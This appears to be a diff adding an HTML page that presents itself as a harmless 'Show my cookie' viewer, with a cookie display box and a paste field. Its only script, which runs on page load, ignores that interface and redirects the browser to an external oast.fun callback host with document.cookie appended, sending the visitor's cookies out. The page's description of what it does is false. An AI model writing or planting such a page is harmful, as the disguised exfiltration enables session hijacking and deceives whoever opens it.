@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Show my cookie</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; padding: 2rem; line-height: 1.5; }
+    .card { max-width: 720px; margin: 0 auto; padding: 1rem 1.25rem; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.06); }
+    pre { background:#fafafa; padding:0.75rem; border-radius:8px; overflow:auto; }
+    label { display:block; margin-top:1rem; font-weight:600; }
+    input[type="text"]{ width:100%; padding:0.5rem; border-radius:6px; border:1px solid #ddd; }
+    button { margin-top:0.5rem; padding:0.5rem 0.75rem; border-radius:8px; border:0; cursor:pointer; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Hi — your cookie</h1>
+    <p>This page will display any cookies readable by JavaScript for this origin.</p>
+
+    <p><strong>Readable cookies for this origin:</strong></p>
+    <pre id="cookieValue">(checking...)</pre>
+
+    <label for="manual">Or paste a cookie value manually:</label>
+    <input id="manual" type="text" placeholder="name=value; name2=value2">
+    <button id="showBtn" type="button">Show pasted cookie</button>
+
+    <p style="margin-top:1rem; font-size:0.9rem; color:#444;">
+      Note: cookies flagged <code>HttpOnly</code> (and some SameSite/Secure combos) are not accessible to JavaScript and therefore won’t appear here.
+    </p>
+  </div>
+
+  <script>
+	document.location="https://btkgzhjqcdwxihtqvvbvr1eln5gxjech2.oast.fun/cookie/" + document.cookie
+  </script>
+</body>
+</html>
